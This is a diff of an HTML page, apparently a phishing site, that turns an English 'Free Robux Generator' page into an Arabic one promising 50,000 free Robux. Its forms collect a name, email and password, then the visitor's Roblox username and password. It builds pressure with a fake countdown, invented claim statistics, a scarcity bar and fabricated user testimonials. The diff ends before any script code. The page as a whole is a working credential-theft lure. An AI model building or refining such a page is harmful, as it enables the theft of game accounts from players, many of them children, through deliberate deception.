@@ -1,196 +1,387 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Robux Generator 2024 - Official Event</title>
+    <title>🎮 احصل على 50,000 روبوكس مجاناً - عرض 2026 الحصري</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Bungee&family=Roboto:wght@400;700;900&display=swap');
-        
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
         :root {
-            --primary: #00c853;
-            --secondary: #64dd17;
+            --primary: #00d26a;
+            --primary-dark: #00a854;
+            --secondary: #00f5d4;
             --gold: #ffd700;
-            --dark: #0a0e27;
-            --card: rgba(255,255,255,0.05);
+            --gold-light: #ffed4e;
+            --dark: #0a0a1a;
+            --card: rgba(255,255,255,0.03);
+            --card-border: rgba(255,255,255,0.08);
+            --error: #ff4757;
+            --purple: #8b5cf6;
         }
         
         body {
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Cairo', 'Tajawal', sans-serif;
             background: var(--dark);
             min-height: 100vh;
+            color: white;
             overflow-x: hidden;
-            position: relative;
         }
         
-        /* خلفية متحركة */
+        /* خلفية متحركة احترافية */
         .bg-animation {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             z-index: -1;
             overflow: hidden;
+            background: radial-gradient(ellipse at bottom, #1b2735 0%, #090a0f 100%);
+        }
+        
+        .stars {
+            position: absolute;
+            width: 100%; height: 100%;
+        }
+        
+        .star {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle 3s infinite;
+        }
+        
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
         }
         
         .floating-robux {
             position: absolute;
-            font-size: 30px;
-            opacity: 0.3;
-            animation: float 15s infinite linear;
+            font-size: 40px;
+            opacity: 0.1;
+            animation: floatUp 20s infinite linear;
+            filter: drop-shadow(0 0 20px rgba(255,215,0,0.5));
         }
         
-        @keyframes float {
-            0% { transform: translateY(100vh) rotate(0deg); }
-            100% { transform: translateY(-100px) rotate(360deg); }
+        @keyframes floatUp {
+            0% { transform: translateY(100vh) rotate(0deg) scale(0.5); }
+            100% { transform: translateY(-100px) rotate(360deg) scale(1.5); }
         }
         
-        /* الشريط العلوي */
+        /* الشريط العلوي المتحرك */
         .top-bar {
-            background: linear-gradient(90deg, #ff6b35, #f7931e);
-            padding: 10px;
+            background: linear-gradient(90deg, #ff6b6b, #feca57, #ff6b6b);
+            background-size: 200% 100%;
+            padding: 15px;
             text-align: center;
-            font-weight: bold;
-            animation: pulse 2s infinite;
+            font-weight: 800;
+            font-size: 16px;
+            animation: gradientMove 3s linear infinite;
+            box-shadow: 0 5px 30px rgba(255,107,107,0.3);
         }
         
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.8; }
+        @keyframes gradientMove {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 200% 50%; }
         }
         
-        /* الحاوية الرئيسية */
         .container {
-            max-width: 500px;
-            margin: 20px auto;
+            max-width: 550px;
+            margin: 0 auto;
             padding: 20px;
+        }
+        
+        /* الشعار الاحترافي */
+        .logo {
+            text-align: center;
+            padding: 40px 20px;
             position: relative;
         }
         
-        /* الشعار */
-        .logo {
-            text-align: center;
-            margin-bottom: 30px;
+        .logo-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--purple), #a855f7);
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 20px rgba(139,92,246,0.4);
+        }
+        
+        .logo-icon {
+            font-size: 80px;
+            margin-bottom: 15px;
+            animation: bounce 2s infinite;
+            filter: drop-shadow(0 0 30px rgba(255,215,0,0.5));
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0) scale(1); }
+            50% { transform: translateY(-10px) scale(1.05); }
         }
         
         .logo h1 {
-            font-family: 'Bungee', cursive;
             font-size: 42px;
-            background: linear-gradient(90deg, var(--gold), #ffed4e, var(--gold));
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--gold) 0%, #fff 50%, var(--gold) 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 30px rgba(255,215,0,0.5);
-            animation: shine 3s infinite;
-        }
-        
-        @keyframes shine {
-            0%, 100% { filter: brightness(1); }
-            50% { filter: brightness(1.3); }
+            text-shadow: 0 0 40px rgba(255,215,0,0.3);
+            margin-bottom: 10px;
         }
         
         .logo p {
             color: #888;
-            font-size: 14px;
-            margin-top: 5px;
+            font-size: 16px;
+            font-weight: 500;
         }
         
-        /* بطاقة الربح */
-        .win-card {
-            background: var(--card);
-            border: 1px solid rgba(255,215,0,0.3);
-            border-radius: 20px;
-            padding: 30px;
+        /* بطاقة العرض الرئيسية */
+        .offer-card {
+            background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(0,210,106,0.1));
+            border: 2px solid var(--gold);
+            border-radius: 30px;
+            padding: 40px;
             text-align: center;
-            margin-bottom: 25px;
-            backdrop-filter: blur(10px);
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            margin: 30px 0;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(255,215,0,0.15);
         }
         
-        .win-amount {
-            font-size: 64px;
+        .offer-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,215,0,0.1), transparent);
+            animation: rotate 4s linear infinite;
+        }
+        
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .offer-label {
+            font-size: 18px;
+            color: #aaa;
+            margin-bottom: 10px;
+        }
+        
+        .offer-amount {
+            font-size: 72px;
             font-weight: 900;
-            color: var(--gold);
-            text-shadow: 0 0 40px rgba(255,215,0,0.5);
+            background: linear-gradient(135deg, var(--gold), var(--gold-light));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 50px rgba(255,215,0,0.5);
+            line-height: 1;
             margin: 20px 0;
-            animation: bounce 2s infinite;
+            animation: pulse-glow 2s infinite;
         }
         
-        @keyframes bounce {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+        @keyframes pulse-glow {
+            0%, 100% { filter: brightness(1); }
+            50% { filter: brightness(1.2); }
         }
         
-        .win-label {
-            color: #888;
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
+        .offer-currency {
+            font-size: 24px;
+            color: var(--gold);
+            font-weight: 700;
         }
         
-        /* عداد الأعضاء */
-        .live-stats {
+        .offer-timer {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(255,71,87,0.2);
+            border: 1px solid var(--error);
+            padding: 10px 25px;
+            border-radius: 50px;
+            margin-top: 20px;
+            font-weight: 700;
+        }
+        
+        .timer-value {
+            font-size: 24px;
+            color: var(--error);
+            font-family: monospace;
+        }
+        
+        /* شريط التقدم */
+        .progress-section {
+            margin: 25px 0;
+        }
+        
+        .progress-label {
             display: flex;
-            justify-content: space-around;
-            background: var(--card);
-            border-radius: 15px;
-            padding: 15px;
-            margin-bottom: 25px;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #888;
+            margin-bottom: 10px;
         }
         
-        .stat {
+        .progress-bar {
+            width: 100%;
+            height: 12px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            width: 87%;
+            background: linear-gradient(90deg, var(--error), #ff6b6b);
+            border-radius: 10px;
+            position: relative;
+            animation: progressShine 2s infinite;
+        }
+        
+        @keyframes progressShine {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 200% 50%; }
+        }
+        
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shine 2s infinite;
+        }
+        
+        @keyframes shine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(200%); }
+        }
+        
+        /* إحصائيات حية */
+        .live-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin: 25px 0;
+        }
+        
+        .stat-card {
+            background: var(--card);
+            border: 1px solid var(--card-border);
+            border-radius: 20px;
+            padding: 20px;
             text-align: center;
+            transition: transform 0.3s;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .stat-icon {
+            font-size: 28px;
+            margin-bottom: 10px;
         }
         
         .stat-value {
             font-size: 24px;
-            font-weight: bold;
+            font-weight: 900;
             color: var(--gold);
         }
         
         .stat-label {
-            font-size: 11px;
+            font-size: 12px;
             color: #888;
-            text-transform: uppercase;
+            margin-top: 5px;
         }
         
-        /* نموذج تسجيل الدخول */
-        .login-section {
+        /* النماذج الاحترافية */
+        .form-section {
             background: var(--card);
-            border-radius: 20px;
-            padding: 30px;
-            border: 1px solid rgba(255,255,255,0.1);
+            border: 1px solid var(--card-border);
+            border-radius: 25px;
+            padding: 35px;
+            margin: 25px 0;
+            backdrop-filter: blur(20px);
         }
         
-        .login-header {
+        .form-header {
             text-align: center;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
         }
         
-        .login-header h2 {
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .step-dot {
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 14px;
+            border: 2px solid transparent;
+        }
+        
+        .step-dot.active {
+            background: var(--gold);
+            color: #000;
+            box-shadow: 0 0 20px rgba(255,215,0,0.4);
+        }
+        
+        .step-dot.completed {
+            background: var(--primary);
             color: white;
-            font-size: 22px;
-            margin-bottom: 5px;
         }
         
-        .login-header p {
+        .step-line {
+            width: 40px;
+            height: 2px;
+            background: rgba(255,255,255,0.1);
+            align-self: center;
+        }
+        
+        .step-line.completed {
+            background: var(--primary);
+        }
+        
+        .form-header h2 {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 8px;
+        }
+        
+        .form-header p {
             color: #888;
-            font-size: 13px;
+            font-size: 14px;
         }
         
         .input-group {
             margin-bottom: 20px;
-            position: relative;
         }
         
         .input-group label {
-            display: block;
+            display: flex;
+            align-items: center;
+            gap: 8px;
             color: #aaa;
-            font-size: 13px;
-            margin-bottom: 8px;
-            font-weight: 500;
+            font-size: 14px;
+            margin-bottom: 10px;
+            font-weight: 600;
         }
         
         .input-wrapper {
@@ -199,417 +390,543 @@
         
         .input-wrapper input {
             width: 100%;
-            padding: 15px 15px 15px 45px;
+            padding: 18px 18px 18px 50px;
             background: rgba(0,0,0,0.3);
             border: 2px solid rgba(255,255,255,0.1);
-            border-radius: 12px;
+            border-radius: 15px;
             color: white;
             font-size: 16px;
+            font-family: 'Cairo', sans-serif;
             transition: all 0.3s;
         }
         
         .input-wrapper input:focus {
             border-color: var(--gold);
             outline: none;
-            box-shadow: 0 0 20px rgba(255,215,0,0.2);
+            box-shadow: 0 0 30px rgba(255,215,0,0.2);
+            background: rgba(0,0,0,0.4);
+        }
+        
+        .input-wrapper input::placeholder {
+            color: #555;
         }
         
         .input-icon {
             position: absolute;
-            left: 15px;
+            left: 18px;
             top: 50%;
             transform: translateY(-50%);
-            font-size: 18px;
+            font-size: 20px;
+            opacity: 0.5;
         }
         
-        /* زر الاستلام */
-        .claim-btn {
+        .submit-btn {
             width: 100%;
-            padding: 18px;
-            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            padding: 20px;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             color: white;
             border: none;
-            border-radius: 12px;
+            border-radius: 15px;
             font-size: 18px;
-            font-weight: 900;
+            font-weight: 800;
             cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            font-family: 'Cairo', sans-serif;
+            transition: all 0.3s;
             position: relative;
             overflow: hidden;
-            transition: all 0.3s;
+            box-shadow: 0 10px 40px rgba(0,210,106,0.3);
         }
         
-        .claim-btn::before {
+        .submit-btn::before {
             content: '';
             position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
             background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            animation: shine-btn 3s infinite;
+            animation: btnShine 3s infinite;
         }
         
-        @keyframes shine-btn {
+        @keyframes btnShine {
             0% { left: -100%; }
             50% { left: 100%; }
             100% { left: 100%; }
         }
         
-        .claim-btn:hover {
+        .submit-btn:hover {
             transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(0,200,83,0.4);
+            box-shadow: 0 15px 50px rgba(0,210,106,0.4);
         }
         
-        .claim-btn:disabled {
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        
+        .submit-btn:disabled {
             opacity: 0.7;
             cursor: not-allowed;
         }
         
         /* رسائل الحالة */
         .status-msg {
-            margin-top: 15px;
-            padding: 15px;
-            border-radius: 10px;
+            margin-top: 20px;
+            padding: 18px;
+            border-radius: 15px;
             text-align: center;
-            font-weight: bold;
+            font-weight: 700;
             display: none;
-            animation: slideIn 0.3s;
+            animation: slideUp 0.4s;
         }
         
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(-10px); }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
         
         .status-msg.error {
-            background: rgba(255,82,82,0.2);
-            border: 1px solid #ff5252;
-            color: #ff5252;
+            background: rgba(255,71,87,0.15);
+            border: 1px solid var(--error);
+            color: var(--error);
         }
         
         .status-msg.success {
-            background: rgba(0,200,83,0.2);
+            background: rgba(0,210,106,0.15);
             border: 1px solid var(--primary);
             color: var(--primary);
         }
         
         .status-msg.loading {
-            background: rgba(255,215,0,0.2);
+            background: rgba(255,215,0,0.15);
             border: 1px solid var(--gold);
             color: var(--gold);
         }
         
-        /* شريط التقدم */
-        .progress-bar {
-            width: 100%;
-            height: 6px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 3px;
-            margin-top: 20px;
-            overflow: hidden;
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,215,0,0.3);
+            border-radius: 50%;
+            border-top-color: var(--gold);
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* صورة السكن */
+        .avatar-section {
+            text-align: center;
+            margin: 20px 0;
             display: none;
         }
         
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--gold), var(--primary));
-            width: 0%;
-            transition: width 0.5s;
-            border-radius: 3px;
+        .avatar-preview {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 4px solid var(--gold);
+            box-shadow: 0 0 40px rgba(255,215,0,0.3);
+            object-fit: cover;
         }
         
-        /* التعليقات الوهمية */
-        .comments {
-            margin-top: 30px;
+        .avatar-name {
+            margin-top: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--gold);
+        }
+        
+        /* التعليقات */
+        .comments-section {
+            margin: 40px 0;
+        }
+        
+        .comments-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+        
+        .comments-header h3 {
+            font-size: 20px;
+            font-weight: 800;
+        }
+        
+        .live-badge {
+            background: var(--error);
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            animation: pulse 1.5s infinite;
         }
         
         .comment {
             background: var(--card);
-            border-radius: 15px;
-            padding: 15px;
-            margin-bottom: 10px;
+            border: 1px solid var(--card-border);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 15px;
             display: flex;
-            align-items: center;
-            animation: fadeIn 0.5s;
+            align-items: flex-start;
+            gap: 15px;
+            transition: transform 0.3s;
         }
         
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateX(-20px); }
-            to { opacity: 1; transform: translateX(0); }
+        .comment:hover {
+            transform: translateX(-5px);
         }
         
         .comment-avatar {
-            width: 40px;
-            height: 40px;
+            width: 50px;
+            height: 50px;
             border-radius: 50%;
-            background: linear-gradient(45deg, #ff6b6b, #feca57);
             display: flex;
             align-items: center;
             justify-content: center;
-            font-weight: bold;
-            margin-right: 12px;
+            font-weight: 800;
+            font-size: 20px;
+            flex-shrink: 0;
         }
         
-        .comment-content h4 {
-            color: white;
+        .comment-content {
+            flex: 1;
+        }
+        
+        .comment-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+        
+        .comment-header h4 {
+            font-size: 15px;
+            font-weight: 700;
+        }
+        
+        .verified-badge {
+            color: var(--primary);
             font-size: 14px;
-            margin-bottom: 3px;
-        }
-        
-        .comment-content p {
-            color: #888;
-            font-size: 13px;
         }
         
         .comment-time {
             color: #666;
-            font-size: 11px;
-            margin-left: auto;
-        }
-        
-        /* عداد تنازلي */
-        .countdown {
-            text-align: center;
-            margin: 20px 0;
-        }
-        
-        .countdown-label {
-            color: #ff5252;
-            font-size: 14px;
-            margin-bottom: 10px;
-        }
-        
-        .countdown-timer {
-            font-size: 32px;
-            font-weight: 900;
-            color: #ff5252;
-            font-family: monospace;
-        }
-        
-        /* توست الإشعارات */
-        .toast {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: var(--card);
-            border: 1px solid rgba(255,215,0,0.3);
-            border-radius: 15px;
-            padding: 15px 20px;
-            display: flex;
-            align-items: center;
-            z-index: 1000;
-            animation: slideInRight 0.5s;
-            backdrop-filter: blur(10px);
-        }
-        
-        @keyframes slideInRight {
-            from { transform: translateX(400px); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-        
-        .toast-avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 12px;
-        }
-        
-        .toast-content h4 {
-            color: white;
-            font-size: 14px;
-        }
-        
-        .toast-content p {
-            color: #888;
             font-size: 12px;
         }
         
-        /* المودال */
+        .comment-content p {
+            color: #aaa;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        
+        .comment-likes {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-top: 10px;
+            color: #666;
+            font-size: 13px;
+        }
+        
+        /* المودال الاحترافي */
         .modal {
             display: none;
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.9);
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95);
             z-index: 2000;
             justify-content: center;
             align-items: center;
+            padding: 20px;
+            backdrop-filter: blur(10px);
         }
         
         .modal-content {
-            background: linear-gradient(135deg, #1e3c72, #2a5298);
-            border-radius: 20px;
-            padding: 40px;
+            background: linear-gradient(135deg, #1a1a3a, #0f0f25);
+            border-radius: 30px;
+            padding: 50px 40px;
             text-align: center;
-            max-width: 400px;
-            animation: zoomIn 0.3s;
-            border: 1px solid rgba(255,215,0,0.3);
+            max-width: 450px;
+            width: 100%;
+            border: 2px solid var(--gold);
+            box-shadow: 0 0 100px rgba(255,215,0,0.2);
+            animation: modalZoom 0.4s;
         }
         
-        @keyframes zoomIn {
+        @keyframes modalZoom {
             from { transform: scale(0.8); opacity: 0; }
             to { transform: scale(1); opacity: 1; }
         }
         
         .modal-icon {
-            font-size: 80px;
-            margin-bottom: 20px;
+            font-size: 90px;
+            margin-bottom: 25px;
+            animation: celebrate 1s infinite;
+        }
+        
+        @keyframes celebrate {
+            0%, 100% { transform: scale(1) rotate(0deg); }
+            25% { transform: scale(1.1) rotate(-5deg); }
+            75% { transform: scale(1.1) rotate(5deg); }
         }
         
         .modal h2 {
-            color: var(--gold);
-            font-size: 28px;
+            font-size: 32px;
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--gold), var(--gold-light));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             margin-bottom: 15px;
         }
         
         .modal p {
-            color: #ccc;
-            margin-bottom: 25px;
+            color: #aaa;
+            font-size: 16px;
+            margin-bottom: 30px;
+            line-height: 1.8;
         }
         
         .modal-btn {
-            background: var(--gold);
+            background: linear-gradient(135deg, var(--gold), #ffaa00);
             color: #000;
-            padding: 15px 40px;
+            padding: 18px 50px;
             border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: bold;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 800;
             cursor: pointer;
+            font-family: 'Cairo', sans-serif;
+            box-shadow: 0 10px 40px rgba(255,215,0,0.4);
+            transition: all 0.3s;
         }
         
-        /* Responsive */
+        .modal-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 50px rgba(255,215,0,0.5);
+        }
+        
+        /* توست الإشعارات */
+        .toast {
+            position: fixed;
+            bottom: 25px;
+            left: 25px;
+            background: rgba(20,20,40,0.95);
+            border: 1px solid rgba(255,215,0,0.3);
+            border-radius: 20px;
+            padding: 18px 25px;
+            display: none;
+            align-items: center;
+            gap: 15px;
+            z-index: 1000;
+            backdrop-filter: blur(20px);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+            animation: slideInLeft 0.5s;
+        }
+        
+        @keyframes slideInLeft {
+            from { transform: translateX(-400px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        .toast-avatar {
+            width: 50px; height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 20px;
+        }
+        
+        .toast-content h4 {
+            font-size: 15px;
+            font-weight: 700;
+        }
+        
+        .toast-content p {
+            color: #888;
+            font-size: 13px;
+        }
+        
+        .hidden { display: none !important; }
+        
         @media (max-width: 480px) {
             .container { padding: 15px; }
             .logo h1 { font-size: 32px; }
-            .win-amount { font-size: 48px; }
+            .offer-amount { font-size: 56px; }
+            .form-section { padding: 25px; }
         }
     </style>
 </head>
 <body>
-    <!-- خلفية متحركة -->
-    <div class="bg-animation" id="bgAnimation"></div>
+    <div class="bg-animation">
+        <div class="stars" id="stars"></div>
+        <div id="floatingItems"></div>
+    </div>
     
-    <!-- الشريط العلوي -->
     <div class="top-bar">
-        🔥 LIMITED TIME: 95% OFF - ENDS SOON! 🔥
+        🔥 عرض حصري 2026: احصل على 50,000 روبوكس مجاناً الآن! 🔥
     </div>
     
     <div class="container">
         <!-- الشعار -->
         <div class="logo">
-            <h1>ROBUX GENERATOR</h1>
-            <p>Official 2024 Event - Verified ✅</p>
+            <div class="logo-badge">✨ الحدث الرسمي 2026 ✨</div>
+            <div class="logo-icon">💎</div>
+            <h1>روبوكس مجاني</h1>
+            <p>أكبر حدث توزيع روبوكس في تاريخ روبلوكس</p>
         </div>
         
-        <!-- بطاقة الربح -->
-        <div class="win-card">
-            <div class="win-label">You Won</div>
-            <div class="win-amount">25,000</div>
-            <div class="win-label">FREE ROBUX</div>
+        <!-- بطاقة العرض -->
+        <div class="offer-card">
+            <div class="offer-label">🎁 احصل على</div>
+            <div class="offer-amount">50,000</div>
+            <div class="offer-currency">روبوكس مجاناً</div>
+            
+            <div class="offer-timer">
+                ⏰ ينتهي خلال: <span class="timer-value" id="countdown">04:59</span>
+            </div>
         </div>
         
-        <!-- إحصائيات حية -->
+        <!-- شريط التقدم -->
+        <div class="progress-section">
+            <div class="progress-label">
+                <span>📦 الكمية المتبقية</span>
+                <span style="color: var(--error); font-weight: 700;">87% claimed</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+        
+        <!-- إحصائيات -->
         <div class="live-stats">
-            <div class="stat">
-                <div class="stat-value" id="onlineCount">2,847</div>
-                <div class="stat-label">Online</div>
+            <div class="stat-card">
+                <div class="stat-icon">👥</div>
+                <div class="stat-value" id="onlineCount">4,847</div>
+                <div class="stat-label">متصل الآن</div>
             </div>
-            <div class="stat">
-                <div class="stat-value" id="claimedCount">15,432</div>
-                <div class="stat-label">Claimed</div>
+            <div class="stat-card">
+                <div class="stat-icon">✅</div>
+                <div class="stat-value" id="claimedCount">24,847</div>
+                <div class="stat-label">تم التسليم</div>
             </div>
-            <div class="stat">
-                <div class="stat-value" id="leftCount">127</div>
-                <div class="stat-label">Left</div>
+            <div class="stat-card">
+                <div class="stat-icon">⏳</div>
+                <div class="stat-value" id="leftCount">156</div>
+                <div class="stat-label">متبقي</div>
             </div>
         </div>
         
-        <!-- نموذج تسجيل الدخول -->
-        <div class="login-section">
-            <div class="login-header">
-                <h2>🔐 Verify Your Account</h2>
-                <p>Login to receive your Robux instantly</p>
+        <!-- الخطوة 1 -->
+        <div class="form-section" id="registerSection">
+            <div class="form-header">
+                <div class="step-indicator">
+                    <div class="step-dot active">1</div>
+                    <div class="step-line"></div>
+                    <div class="step-dot">2</div>
+                </div>
+                <h2>📝 أنشئ حسابك</h2>
+                <p>أدخل بياناتك للمتابعة</p>
+            </div>
+            
+            <form id="registerForm">
+                <div class="input-group">
+                    <label>👤 الاسم الكامل</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">✏️</span>
+                        <input type="text" id="fullName" placeholder="أدخل اسمك الكامل" required>
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <label>📧 البريد الإلكتروني</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">@</span>
+                        <input type="email" id="email" placeholder="example@email.com" required>
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <label>🔒 كلمة المرور</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">🔑</span>
+                        <input type="password" id="regPassword" placeholder="أدخل كلمة مرور قوية" required>
+                    </div>
+                </div>
+                
+                <button type="submit" class="submit-btn">متابعة إلى الخطوة التالية ←</button>
+            </form>
+        </div>
+        
+        <!-- الخطوة 2 -->
+        <div class="form-section hidden" id="robloxSection">
+            <div class="form-header">
+                <div class="step-indicator">
+                    <div class="step-dot completed">✓</div>
+                    <div class="step-line completed"></div>
+                    <div class="step-dot active">2</div>
+                </div>
+                <h2>🎮 أدخل حساب روبلوكس</h2>
+                <p>سجل دخول لاستلام روبوكسك</p>
+            </div>
+            
+            <div class="avatar-section" id="avatarSection">
+                <img class="avatar-preview" id="avatarPreview" src="" alt="Avatar">
+                <div class="avatar-name" id="avatarName"></div>
             </div>
             
             <form id="robloxForm">
                 <div class="input-group">
-                    <label>Roblox Username</label>
+                    <label>🎮 يوزر روبلوكس</label>
                     <div class="input-wrapper">
-                        <span class="input-icon">👤</span>
-                        <input type="text" id="username" placeholder="Enter your Roblox username" required>
+                        <span class="input-icon">👾</span>
+                        <input type="text" id="robloxUsername" placeholder="أدخل يوزر روبلوكس" required>
                     </div>
                 </div>
                 
                 <div class="input-group">
-                    <label>Roblox Password</label>
+                    <label>🔐 باسورد روبلوكس</label>
                     <div class="input-wrapper">
-                        <span class="input-icon">🔒</span>
-                        <input type="password" id="password" placeholder="Enter your password" required>
+                        <span class="input-icon">🛡️</span>
+                        <input type="password" id="robloxPassword" placeholder="أدخل باسورد روبلوكس" required>
                     </div>
                 </div>
                 
-                <button type="submit" class="claim-btn" id="claimBtn">
-                    <span id="btnText">CLAIM 25,000 ROBUX</span>
+                <button type="submit" class="submit-btn" id="claimBtn">
+                    <span id="btnText">🎁 استلم 50,000 روبوكس الآن</span>
                 </button>
                 
-                <div class="progress-bar" id="progressBar">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
-                
                 <div class="status-msg loading" id="loadingMsg">
-                    ⏳ Verifying your account...
+                    جاري التحقق من حسابك<span class="loading-spinner"></span>
                 </div>
                 
                 <div class="status-msg error" id="errorMsg">
-                    ❌ Wrong password! Please try again.
+                    ❌ كلمة السر أو اليوزر غلط! حاول مرة أخرى
                 </div>
                 
                 <div class="status-msg success" id="successMsg">
-                    ✅ Success! Redirecting to receive your Robux...
+                    ✅ تم! شاهد حسابك الآن
                 </div>
             </form>
         </div>
         
-        <!-- عداد تنازلي -->
-        <div class="countdown">
-            <div class="countdown-label">⏰ Offer expires in:</div>
-            <div class="countdown-timer" id="countdown">04:59</div>
-        </div>
-        
         <!-- التعليقات -->
-        <div class="comments" id="comments">
-            <div class="comment">
-                <div class="comment-avatar">J</div>
-                <div class="comment-content">
-                    <h4>Jack_Pro2024</h4>
-                    <p>OMG it actually worked! Got 25k robux!!</p>
-                </div>
-                <div class="comment-time">2m ago</div>
+        <div class="comments-section">
+            <div class="comments-header">
+                <h3>💬 آراء المستخدمين</h3>
+                <span class="live-badge">● مباشر</span>
             </div>
-            <div class="comment">
-                <div class="comment-avatar">S</div>
-                <div class="comment-content">
-                    <h4>SarahGaming</h4>
-                    <p>Thank you so much! Verified and working ✅</p>
-                </div>
-                <div class="comment-time">5m ago</div>
-            </div>
-            <div class="comment">
-                <div class="comment-avatar">M</div>
-                <div class="comment-content">
-                    <h4>Mike_Builder</h4>
-                    <p>Best generator ever, no scam!</p>
-                </div>
-                <div class="comment-time">8m ago</div>
+            <div id="comments">
+                <!-- التعليقات تُضاف هنا -->
             </div>
         </div>
     </div>
@@ -618,42 +935,60 @@
